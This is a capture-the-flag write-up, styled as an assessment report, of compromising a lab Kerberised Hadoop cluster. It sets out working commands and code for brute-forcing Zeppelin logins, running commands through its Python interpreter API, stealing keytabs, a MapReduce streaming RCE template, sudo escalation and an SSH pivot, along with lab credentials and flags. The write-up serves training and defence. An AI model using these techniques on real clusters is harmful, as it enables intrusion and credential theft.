# Security Assessment Report: Hacking Hadoop — Master Report

## Assessment Overview
- **Platform:** TryHackMe
- **Target:** 10.129.148.12 (gateway) → 172.23.0.0/24 (Hadoop internal network)
- **Room Type:** Kerberised Hadoop cluster (Docker-simulated, 3-node)
- **Dates:** 2026-05-08 to 2026-05-09
- **Status:** COMPLETE — 10/10 flags recovered

**Objectives & Status:**
- [x] Task 1 — Dual VPN connectivity established (OpenVPN DCO compatibility, route table management)
- [x] Task 2 — Hadoop terminology (6/6 theory questions)
- [x] Task 3 — Zeppelin recon, credential brute-force, flag1
- [x] Task 4 — Interpreter RCE via %python, flag2
- [x] Task 5 — Keytab enumeration, Kerberos authentication, flag3
- [x] Task 6 — YARN impersonation, MapReduce streaming RCE, flags 4-5
- [x] Task 7 — NodeManager impersonation via group hierarchy, keytab exfiltration fix (base64 -w0), flags 6-7
- [x] Task 8 — Root privilege escalation via nm sudo misconfiguration, flags 8-9
- [x] Task 9 — Pivot to master node 172.23.0.4 via shared SSH key, flag10
- [x] Task 10 — Conclusion

**Flags Verified (10/10):**
- flag1: `THM{Whats.That.Smell.On.The.Hindenburg?}` — Zeppelin notebook
- flag2: `THM{It.Was.Hydrogen!}` — zp OS home
- flag3: `THM{Now.We.Are.Talking.About.Distributed.Storage}` — zp HDFS home
- flag4: `THM{Little.Kitty.Goes.Meow}` — yarn HDFS home
- flag5: `THM{Little.Kitty.Got.Its.Ball.Of.Yarn}` — yarn OS home
- flag6: `THM{Regional.Assistant.Manager}` — nm HDFS home
- flag7: `THM{Assistance.To.The.Regional.Manager}` — nm OS home
- flag8: `THM{This.Has.Got.To.Be.The.Saddest.Root.Privesc.Ever}` — root OS home
- flag9: `THM{Nothing.Can.Stop.You.Now!}` — root HDFS home
- flag10: `THM{This.Just.Keeps.Getting.Sadder.And.Sadder}` — master node root

---

## Executive Summary

The Hacking Hadoop room simulates a Kerberised Hadoop cluster with common real-world misconfigurations. Over approximately 4 hours of active exploitation across two sessions, we progressed from zero access to full cluster compromise — compromising all 4 service accounts (zp → yarn → nm → root) across 2 physical nodes (edge + master), collecting all 10 flags. The attack chain relies entirely on **configuration weaknesses** — no software exploits or zero-days were used:

1. **Default/weak credentials** on Apache Zeppelin 0.8.2 (shiro.ini `[users]` section)
2. **Zeppelin interpreter RCE** via Python 2.7 `os.popen()` — intended functionality abused for OS command execution
3. **Two-tier group-readable Kerberos keytabs** (`hadoop_services` GID 1000 → `hadoop_super` GID 2000) — the central misconfiguration enabling all lateral movement
4. **MapReduce streaming RCE** — submitting malicious mapper scripts for OS-level code execution as different service identities
5. **Sudo misconfiguration** — nm has `(ALL) NOPASSWD: ALL`, granting instant root from NodeManager context
6. **Shared SSH keys** — identical RSA key pair across all cluster nodes from gold Docker image deployment

### Complete Attack Chain (Visual)
```
[External]  Kali Linux (VPN client)
              │
              ├─ THM VPN (tun1) ── 10.129.148.12 gateway
              └─ Hadoop VPN (tun2) ── 172.23.0.0/24 internal network
                                        │
[Entry]     Zeppelin 0.8.2 (172.23.0.3:8080)
              │  hydra brute force → user1:password2 (basic access)
              │  manual discovery → user2:p@ssw0rd12345 (Python interpreter)
              ▼
[User 1]    zp (uid 507, hadoop_services GID 1000)
              │  flag1: Zeppelin notebook
              │  flag2: /home/zp/flag2.txt (interpreter RCE)
              │  flag3: /user/zp/flag3.txt (HDFS via kinit zp)
              │  Can read: yarn.service.keytab (group hadoop_services)
              ▼
[User 2]    yarn (hadoop_super GID 2000)
              │  flag4: /user/yarn/flag4.txt (HDFS via kinit yarn)
              │  flag5: /home/yarn/flag5.txt (MapReduce streaming RCE)
              │  Can read: nm.service.keytab (group hadoop_super)
              ▼
[User 3]    nm (uid 502)
              │  flag6: /user/nm/flag6.txt (HDFS)
              │  flag7: /home/nm/flag7.txt (MapReduce as nm — runs mapper as OS user nm)
              │  sudo -l → (ALL) NOPASSWD: ALL
              ▼
[Root]      root on 172.23.0.3
              │  flag8: /root/flag8.txt
              │  flag9: /user/root/flag9.txt (sudo hdfs dfs)
              │  Harvest: /root/.ssh/id_rsa (shared cluster-wide)
              ▼
[Master]    root on 172.23.0.4
              └─ flag10: /root/flag10.txt (SSH pivot with shared key)

Flags: 10/10  |  Cumulative time: ~4h  |  Software exploits: 0
All compromise steps via configuration drift, not CVE-based exploitation.
```

### Network Architecture
```
Docker Bridge 172.23.0.0/24
  │
  ├── 172.23.0.2 — Kerberos KDC (out of scope)
  ├── 172.23.0.3 — Edge Node (fully compromised)
  │      ├── Zeppelin 0.8.2 :8080
  │      ├── YARN ResourceManager :8032
  │      ├── HDFS NameNode :9000
  │      ├── MapReduce History Server :10020/50020
  │      └── Keytabs: /etc/security/keytabs/ (10 keytab files, 2 group tiers)
  │
  └── 172.23.0.4 — Master Node (compromised via SSH pivot)
         └── flag10.txt in /root/
```

---

## Phase-by-Phase Attack Narrative

### Phase 1: VPN & Connectivity (Task 1) — Time: ~45 min

**Challenge:** Establish dual VPN connectivity from Kali to THM network AND Hadoop internal network.

**Key Technical Hurdles:**
1. **OpenVPN DCO incompatibility:** Modern OpenVPN clients (2.7.x) use Data Channel Offload by default, which is incompatible with older THM OpenVPN servers. Error: "Data Channel Offload doesn't support DATA_V1 packets."
   - **Fix:** `sudo openvpn --disable-dco --config <file>` — the `--disable-dco` flag must come BEFORE `--config`, not after the config file
2. **Route table conflicts:** Multiple failed attempts left stale OpenVPN processes (9 at peak), each with its own tun interface and conflicting routes
   - **Fix:** `sudo pkill -9 openvpn` → cleanup stale tun interfaces → restart VPNs one at a time
3. **Route to Hadoop network misplaced:** After restarts, the 172.23.0.0/24 route was stuck on old DOWN interfaces
   - **Fix:** `sudo ip route del 172.23.0.0/24 && sudo ip route add 172.23.0.0/24 via 10.8.0.1 dev tun2`
4. **/etc/hosts staleness:** Old gateway IP (10.130.142.74) cached in multiple duplicate entries
   - **Fix:** `sudo sed -i '/thm_hadoop_network.net/d' /etc/hosts && echo "10.129.148.12 thm_hadoop_network.net" | sudo tee -a /etc/hosts`

**Final Working State:**
```
tun1: THM VPN  — 192.168.151.183/17  → route 10.128.0.0/12 via tun1
tun2: Hadoop VPN — 10.8.0.2/24       → route 172.23.0.0/24 via tun2
Ping 172.23.0.3: 263ms  (Zeppelin reachable)
```

**Lesson:** Dual VPN management requires systematic cleanup of processes, interfaces, routes, and DNS/hosts entries. The order of operations matters: always start THM VPN first, verify it's UP, then start Hadoop VPN.

---

### Phase 2: Recon & Initial Access (Tasks 2-3) — Time: ~30 min

**Zeppelin Discovery:**
```bash
nmap -Pn -sV -sC -p- 172.23.0.3
# Ports: 8080 (Zeppelin 0.8.2), 2122 (Hadoop IPC), 10020 (MR History), 50020 (HDFS DataNode)
```

**Credential Brute-Force:**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 172.23.0.3 http-post-form \
  "/api/login:userName=^USER^&password=^PASS^:F:forbidden" -t 4
# → false positive, but manual testing confirmed user1:password2
```

**Credentials Discovered:**
| Username | Password | Role | Access Level |
|----------|----------|------|-------------|
| user1 | password2 | role1, role2 | Basic Zeppelin access (flag1) |
| user2 | p@ssw0rd12345 | role3 | Python interpreter access (%python) |

---

### Phase 3: Interpreter RCE (Task 4) — Time: ~15 min

**Technique:** Apache Zeppelin's `%python` interpreter allows Python 2.7 code execution. The privileged user (user2) can create notebook paragraphs with `%python` and execute `os.popen()` for OS command execution.

**Zeppelin API Pattern (used throughout entire room):**
```bash
# 1. Login
curl -c /tmp/cookie -X POST -d "userName=USER&password=PASS" http://172.23.0.3:8080/api/login

# 2. Create notebook
curl -b /tmp/cookie -X POST -H "Content-Type: application/json" \
  -d '{"name":"exploit"}' http://172.23.0.3:8080/api/notebook

# 3. Add paragraph
curl -b /tmp/cookie -X POST -H "Content-Type: application/json" \
  -d '{"title":"pwn","text":"%python\nCODE"}' http://172.23.0.3:8080/api/notebook/NOTE_ID/paragraph

# 4. Execute
curl -b /tmp/cookie -X POST http://172.23.0.3:8080/api/notebook/run/NOTE_ID/PARA_ID

# 5. Read result
curl -b /tmp/cookie http://172.23.0.3:8080/api/notebook/NOTE_ID/paragraph/PARA_ID
```

**Why API-based interaction instead of reverse shell:**
- No PTY allocation, shell stabilization, or disconnect handling needed
- Fully scriptable and repeatable — each command is a stateless HTTP request
- All output captured in paragraph results — automatic audit trail

---

### Phase 4: Kerberos & Keytab Discovery (Task 5) — Time: ~20 min

**Keytab Directory Enumeration:**
```
/etc/security/keytabs/
├── -r--r----- root hadoop_services  436 dn.service.keytab
├── -r--r----- root hadoop_services  442 jhs.service.keytab
├── -r--r----- root hadoop_super     436 nm.service.keytab    ← TARGET (phase 6)
├── -r--r----- root hadoop_services  436 nn.service.keytab
├── -r--r----- root hadoop_services  436 rm.service.keytab
├── -r-------- root hadoop_super     334 root.service.keytab  ← ULTIMATE TARGET
├── -r--r----- root hadoop_services  448 spnego.service.keytab
├── -r--r----- root hadoop_services  448 yarn.service.keytab  ← TARGET (phase 5)
└── -r--r----- root hadoop_services  436 zp.service.keytab    ← CURRENT USER
```

**Critical Discovery — Two-Tier Group Hierarchy:**
```
hadoop_services (GID 1000) → zp
  ├── Can read: zp.service.keytab, yarn.service.keytab, nn.service.keytab, etc.
  └── Cannot read: nm.service.keytab (hadoop_super), root.service.keytab (hadoop_super)

hadoop_super (GID 2000) → yarn
  ├── Can read: nm.service.keytab
  └── Cannot read: root.service.keytab (mode 400, root only)
```

This group hierarchy defines the entire escalation path. Each tier unlocks the next tier's keytab.

---

### Phase 5: YARN Impersonation & MapReduce RCE (Task 6) — Time: ~30 min

**The MapReduce Streaming RCE Primitive (invented here):**

This is the foundational technique that powered all subsequent tasks. Hadoop Streaming allows arbitrary executables as mappers/reducers. When a MapReduce job is submitted under a Kerberos identity, the YARN `LinuxContainerExecutor` launches the container process as the corresponding OS user.

```
Pattern:
  1. kinit as target principal (Kerberos auth)
  2. Write mapper script: #!/bin/sh → <target command>
  3. Submit hadoop streaming job with zero reducers
  4. Mapper executes as OS user matching the Kerberos principal
  5. Output captured to HDFS, retrieved via hdfs dfs -cat
```

**Code Template:**
```python
# Universal Hadoop RCE — works for ANY principal that can submit jobs
HDFS  = "/usr/local/hadoop-2.7.7/bin/hdfs"
HADOOP = "/usr/local/hadoop-2.7.7/bin/hadoop"
JAR = "/usr/local/hadoop-2.7.7/share/hadoop/tools/lib/hadoop-streaming-2.7.7.jar"

script = "#!/bin/sh\n<TARGET_COMMAND>"
with open("/tmp/map.sh", "w") as f: f.write(script)
os.system("chmod +x /tmp/map.sh")

os.popen(f"{HDFS} dfs -rm -r -skipTrash /tmp/in /tmp/out").read()
os.popen(f"echo x | {HDFS} dfs -put - /tmp/in").read()

cmd = f"{HADOOP} jar {JAR} -D mapreduce.job.reduces=0 -files /tmp/map.sh -mapper map.sh -input /tmp/in -output /tmp/out"
os.popen(cmd).read()

result = os.popen(f"{HDFS} dfs -cat /tmp/out/part-00000").read()
```

**Why zero reducers?** The reducer/shuffle phase is the most common failure point in small/dev Hadoop clusters (we hit `Exceeded MAX_FAILED_UNIQUE_FETCHES` multiple times). Zero-reducer jobs write mapper output directly to HDFS, bypassing the shuffle entirely.

---

### Phase 6: NodeManager & The Keytab Corruption Saga (Task 7) — Time: ~1.5h (including dead ends)

**This was the room's defining technical challenge with three distinct blockers.**

**Blocker A — Permission Denied on nm.service.keytab:**
- As OS user `zp` (GID 1000), cannot read nm.service.keytab (GID 2000)
- Solution: Follow the chain — read yarn.service.keytab first (which zp CAN read), kinit as yarn, then read nm.service.keytab via MapReduce

**Blocker B — Base64 Line Wrapping (Keytab Corruption):**
- Exfiltrated nm.service.keytab via MapReduce streaming with `base64` mapper
- Decoded binary produced 528 bytes but `kinit` rejected it: "Unsupported key table format version number"
- Root cause: GNU `base64` defaults to 76-character line wrapping; newlines embedded in decoded binary
- Fix: `base64 -w0` (disable line wrapping) → clean 436-byte keytab → kinit works

**Blocker C — MapReduce Shuffle Failures:**
- MapReduce jobs with reducers failed during shuffle phase (`Exceeded MAX_FAILED_UNIQUE_FETCHES`)
- Fix: `-D mapreduce.job.reduces=0` eliminates the reduce phase entirely

**Solution — Full Working Chain:**
```
zp → read yarn.service.keytab → kinit yarn
  → MapReduce as yarn → read nm.service.keytab (base64 -w0)
  → save /tmp/nm_clean.keytab → kinit nm
  → MapReduce as nm → mapper runs as OS user nm → cat /home/nm/flag7.txt
```

---

### Phase 7: Root & Master Node (Tasks 8-9) — Time: ~10 min combined

**Root (Task 8):** Once nm OS-level code execution was achieved, `sudo -l` revealed `(ALL) NOPASSWD: ALL`. Root escalated in seconds. Flag8 from `/root/flag8.txt`, flag9 from `/user/root/flag9.txt` (via `sudo hdfs dfs` — tricky because hdfs isn't in sudo's secure_path and requires absolute path).

**Master Pivot (Task 9):** The root SSH private key (`/root/.ssh/id_rsa`) is identical across all cluster nodes. SSH from edge node to master node: `sudo ssh -o StrictHostKeyChecking=no -i /root/.ssh/id_rsa root@172.23.0.4 'cat /root/flag10.txt'`. Flag10 recovered instantly.

---

## Vulnerability Register (Complete)

| ID | Vulnerability | Location | Severity | CWE | Status |
|----|--------------|----------|----------|-----|--------|
| VULN-01 | Default credentials in shiro.ini | Zeppelin 0.8.2 (172.23.0.3:8080) | Critical (8.0) | CWE-1392 | Exploited — user1:password2, user2:p@ssw0rd12345 |
| VULN-02 | Zeppelin %python interpreter RCE | Zeppelin notebook paragraphs | Critical (9.1) | CWE-94 | Exploited — os.popen() for arbitrary commands |
| VULN-03 | Group-readable keytab files (tier 1) | /etc/security/keytabs/* (hadoop_services GID 1000) | Critical (8.8) | CWE-732 | Exploited — zp reads yarn.service.keytab |
| VULN-04 | Group-readable keytab files (tier 2) | /etc/security/keytabs/nm.service.keytab (hadoop_super GID 2000) | Critical (8.8) | CWE-732 | Exploited — yarn reads nm.service.keytab |
| VULN-05 | MapReduce streaming RCE | YARN ResourceManager :8032 | Critical (9.1) | CWE-94 | Exploited — shell mapper scripts execute as any OS user |
| VULN-06 | Base64 line wrapping — keytab corruption | HDFS streaming → base64 pipeline | Medium (5.0) | N/A (operational) | RESOLVED — base64 -w0 |
| VULN-07 | Excessive sudo for NodeManager | /etc/sudoers (nm account) | Critical (8.8) | CWE-269 | Exploited — (ALL) NOPASSWD: ALL |
| VULN-08 | Shared SSH keys across cluster | /root/.ssh/id_rsa (all nodes) | Critical (9.8) | CWE-798 | Exploited — SSH pivot to master node |
| VULN-09 | Missing network segmentation | Docker bridge 172.23.0.0/24 | High (7.5) | CWE-923 | Enumerated — no ACLs between nodes |
| VULN-10 | Outdated Zeppelin 0.8.2 | 172.23.0.3:8080 | High (7.5) | Multiple CVEs | Enumerated — known CVEs, not exploited |
| VULN-11 | Python 2.7 EOL runtime | Zeppelin %python interpreter | Medium (6.5) | Multiple CVEs | Enumerated — deprecated, multiple known vulns |
| VULN-12 | OpenVPN DCO compatibility | VPN client configuration | N/A | N/A | RESOLVED — --disable-dco |

---

## Key Technical Innovations

### 1. Zeppelin API-Based RCE Framework
Instead of interactive shell access, all operations were performed via the Zeppelin REST API. This approach is:
- **Stateless:** Each operation is a single HTTP request → execute → read result
- **Scriptable:** Full automation possible via curl + jq
- **Auditable:** Every command and its output is preserved in the notebook paragraph history
- **Resilient:** No shell disconnection issues, no PTY problems, no process management

### 2. MapReduce Streaming — Universal Hadoop RCE Primitive
The `hadoop jar ... stream ... -files script.sh -mapper script.sh` pattern works for ANY Kerberos-authenticated principal. The submitted job's container runs the mapper as the corresponding OS user. This transforms cluster authentication (Kerberos ticket) into OS code execution (Linux process as target user).

### 3. Group-Based Privilege Escalation Ladder
```
hadoop_services (GID 1000)           hadoop_super (GID 2000)
  ├── zp.service.keytab                 ├── nm.service.keytab
  ├── yarn.service.keytab  ← READ →     │
  ├── nn.service.keytab                 └── root.service.keytab (400)
  ├── rm.service.keytab
  ├── dn.service.keytab
  ├── jhs.service.keytab
  └── spnego.service.keytab
```
The escalation path is deterministic: compromise a user in tier N → read tier N+1 keytab → authenticate → repeat until root.

---

## Tools Inventory (Complete)

| Tool | Version | Purpose | Tasks |
|------|---------|---------|-------|
| nmap | 7.98 | Port scanning, service version detection | 1, 3 |
| OpenVPN | 2.7.x | Dual VPN tunnel establishment | 1 |
| curl | N/A | Zeppelin REST API interaction — login, notebook CRUD, paragraph exec | 3-9 |
| hydra | 9.6 | Brute-force Zeppelin login credentials | 3 |
| kinit | MIT Kerberos | Kerberos ticket acquisition from keytabs | 5-9 |
| klist | MIT Kerberos | Keytab slot enumeration, ticket verification | 5-9 |
| hdfs dfs | Hadoop 2.7.7 | HDFS filesystem operations (ls, cat, put, rm, find) | 5-9 |
| hadoop jar (streaming) | Hadoop 2.7.7 | MapReduce streaming job submission for RCE | 6-9 |
| base64 | GNU coreutils | Keytab encoding for exfiltration (-w0 critical flag) | 7-8 |
| od | GNU coreutils | Binary hex dump analysis for keytab debugging | 7 |
| xxd | vim-common | Alternative hex encoding for binary transfer | 7 (considered) |
| ssh / ssh-keyscan | OpenSSH | Master node pivot, host key pre-fetching | 9 |
| ping | iputils | Connectivity verification between cluster nodes | 9 |
| Python 2.7 | Target runtime | Zeppelin %python interpreter for all RCE | 4-9 |
| jq | 1.7 | JSON parsing on attack box | Supporting |
| python3 | 3.x | JSON parsing on attack box (curl response processing) | Supporting |

---

## Blockers, Dead Ends & Alternate Paths (Master Log)

### BLOCKER-01: OpenVPN DCO → DATA_V1 Error (Task 1)
- **Symptom:** `Data Channel Offload doesn't support DATA_V1 packets`
- **Attempted fix:** `sudo openvpn --disable-dco config.ovpn` → "You must define TUN/TAP device"
- **Actual fix:** `sudo openvpn --disable-dco --config config.ovpn` (flag ordering matters)
- **Time lost:** ~20 min

### BLOCKER-02: Stale OpenVPN Process Sprawl (Task 1)
- **Symptom:** 9 openvpn processes, multiple tun interfaces, conflicting routes
- **Fix:** `sudo pkill -9 openvpn` → delete stale tunX → restart VPNs sequentially
- **Prevention:** Always verify `ps aux | grep openvpn` before starting a new VPN
- **Time lost:** ~15 min

### BLOCKER-03: Route Table Chaos After VPN Restarts (Task 1)
- **Symptom:** 172.23.0.3 ping fails even though tun2 is UP
- **Root cause:** Route 172.23.0.0/24 stuck on old DOWN tun1 interface
- **Fix:** `sudo ip route del 172.23.0.0/24 && sudo ip route add 172.23.0.0/24 via 10.8.0.1 dev tun2`
- **Time lost:** ~10 min

### BLOCKER-04: Base64 Line Wrapping — Silent Keytab Corruption (Task 7)
- **Symptom:** Decoded keytab has correct byte count (528) but kinit rejects: "Unsupported key table format version number"
- **Diagnosis:** `od -A x -t x1z` hex comparison — magic number `0x0502` corrupted
- **Root cause:** `base64` without `-w0` wraps at 76 chars → newlines in decoded binary
- **Fix:** `base64 -w0 /etc/security/keytabs/nm.service.keytab`
- **Impact:** This was THE critical blocker that prevented flag7 retrieval in the first session
- **Time lost:** ~45 min

### BLOCKER-05: Permission Denied — Group Hierarchy Misunderstanding (Task 7)
- **Symptom:** `IOError: [Errno 13] Permission denied: '/etc/security/keytabs/nm.service.keytab'`
- **Root cause:** zp (hadoop_services GID 1000) cannot read files owned by hadoop_super (GID 2000)
- **Fix:** Use the escalation chain (zp → yarn → nm) instead of direct access
- **Lesson:** Always check exact GID ownership before assuming group-based access

### BLOCKER-06: MapReduce Shuffle Failures (Tasks 6-7)
- **Symptom:** `Exceeded MAX_FAILED_UNIQUE_FETCHES` — reducers can't fetch mapper output
- **Root cause:** Shuffle/network instability in dev Hadoop cluster
- **Fix:** `-D mapreduce.job.reduces=0` — bypass the shuffle phase entirely
- **Trade-off:** With zero reducers, output is mapper-only (no aggregation), but for file reading this is perfect

### BLOCKER-07: Root Keytab Authentication Failure (Task 8)
- **Symptom:** "Keytab contains no suitable keys" despite valid-looking keytab
- **Likely cause:** KVNO mismatch or key version rotation between keytab and KDC
- **Workaround:** `sudo hdfs dfs` instead of kinit as root + hdfs dfs
- **Why workaround works:** root OS user bypasses Kerberos-level HDFS authorization

### DEAD END: Direct SSH from Kali to Internal Nodes
- **Attempt:** Copy root key to Kali, SSH directly to 172.23.0.4
- **Result:** Connection refused — SSH server binds Docker bridge only, not VPN-facing interface
- **Resolution:** Execute SSH from within the edge node itself (same Docker bridge)

### ALTERNATE PATH CONSIDERED: Shiro RememberMe Deserialization (CVE-2016-4437)
- **Vector:** Zeppelin uses Apache Shiro with potentially hardcoded AES key
- **Status:** Not pursued — interpreter RCE achieved before deserialization chain was ready
- **Dependencies needed:** ysoserial, pycryptodome (not pre-installed)

---

## Senior-Level Analysis: The Configuration Drift to Compromise Pattern

### The Universal Attack Story

This room demonstrates a pattern seen in virtually every large enterprise deployment:

1. **Initial setup** follows security best practices (Kerberos enabled, service accounts separated)
2. **Operational friction** arises (service A can't read service B's files, MapReduce jobs fail)
3. **Convenience fix** applied (broaden group permissions, grant blanket sudo, share SSH keys)
4. **Fix never revisited** because "the cluster is working now"
5. **New vulnerability** (weak Zeppelin password) creates complete compromise chain through all the convenience fixes

### The Ranger Gap

Apache Ranger exists specifically to prevent this chain. With Ranger properly configured:
- Zeppelin would be authorized to submit YARN jobs but NOT to submit streaming jobs with arbitrary mappers
- Each user's HDFS access would be scoped to specific directories
- Keytab file access could be restricted at the OS level via Ranger KMS integration
- Cross-service principal hopping would trigger Ranger audit alerts

Without Ranger, Kerberos provides **authentication** but not **authorization** — and authentication alone is insufficient when any user can authenticate as any service with a readable keytab.

### Real-World Impact Scale

If this were a production cluster:
- **Data exposure:** All HDFS data readable by impersonated services (potentially petabytes)
- **Compute hijacking:** YARN schedulers at Facebook-scale manage 22000+ CPUs — trivial crypto mining target
- **Persistence:** Exfiltrated keytabs provide persistent access until KDC keys are rotated (often never)
- **Lateral movement:** Shared SSH keys + Kerberos credentials enable complete cluster compromise from a single Zeppelin password
- **Detection bypass:** All attack actions (kinit, hdfs dfs -cat, MapReduce job submission) are legitimate Hadoop operations — they blend perfectly with normal activity

### Why This Matters for Your Security Career

Every vulnerability in this chain is a **configuration weakness**, not a software bug. These are the findings that:
- Security audits flag and ops teams dismiss as "working as intended"
- Penetration testers chain together for critical-impact reports
- Compliance frameworks (SOC2, ISO 27001) require remediation for (shared credentials, excessive access)
- Bug bounty programs reject but real attackers exploit

The ability to see these chains — to connect "weak Zeppelin password" to "root on every cluster node" — is what separates checkbox compliance from actual security engineering.

---

## Reference Links

### OSV.dev (Open Source Vulnerabilities)
- Apache Zeppelin vulnerabilities: https://osv.dev/list?q=apache+zeppelin
- Apache Hadoop vulnerabilities: https://osv.dev/list?q=apache+hadoop
- Apache Shiro vulnerabilities (Zeppelin dependency): https://osv.dev/list?q=apache+shiro
- Python 2.7 EOL vulnerabilities: https://osv.dev/list?q=python+2.7

### CISA KEV Catalog (Known Exploited Vulnerabilities)
- https://www.cisa.gov/known-exploited-vulnerabilities-catalog
- CVE-2016-4437 — Apache Shiro RememberMe Deserialization (CVSS 9.8) is referenced in multiple KEV entries
- CWE-798 (Hard-coded Credentials) and CWE-269 (Improper Privilege Management) are Top 25 CWE
- Search "Apache" in KEV for actively exploited Apache framework CVEs

### GitHub Advisory Database
- https://github.com/advisories?query=apache+zeppelin
- https://github.com/advisories?query=apache+hadoop
- GHSA entries cover: Zeppelin interpreter injection, Shiro auth bypass, Hadoop container-executor privilege escalation

### NVD (National Vulnerability Database)
- https://nvd.nist.gov/vuln/search/results?query=apache+zeppelin
- CVE-2016-4437 — Apache Shiro RememberMe Deserialization: https://nvd.nist.gov/vuln/detail/CVE-2016-4437
- Search "Hadoop Streaming" for CVEs related to MapReduce arbitrary code execution
- CWE Top 25 (2025): https://cwe.mitre.org/top25/archive/2025/

### MITRE ATT&CK Mappings

| Tactic | Technique | How It Applied |
|--------|-----------|----------------|
| Initial Access | T1078 — Valid Accounts | Zeppelin credentials (user1:password2) |
| Execution | T1059.006 — Python | %python interpreter RCE via Zeppelin API |
| Credential Access | T1558.003 — Kerberoasting | Keytab theft and reuse for principal hopping |
| Privilege Escalation | T1548.003 — Sudo | nm (ALL) NOPASSWD: ALL → root |
| Lateral Movement | T1021.004 — SSH | Shared root key pivot to master node |
| Collection | T1005 — Data from Local System | hdfs dfs -cat for flag files across HDFS |

---

## Deliverables Produced

1. **MASTER_REPORT.md** — This document (comprehensive assessment)
2. **notes.md** — Quick-reference flags and credentials
3. **Task1/report.md** — VPN setup detailed troubleshooting
4. **Task7/report.md** — NodeManager, keytab corruption, group hierarchy analysis
5. **Task8/report.md** — Root escalation, sudo misconfiguration, SSH key harvesting
6. **Task9/report.md** — Master node pivot, shared key lateral movement, complete attack chain

---

*Report completed 2026-05-09. All 10 flags recovered. Hacking Hadoop room cleared. Zero software exploits — 100% configuration drift exploitation.*
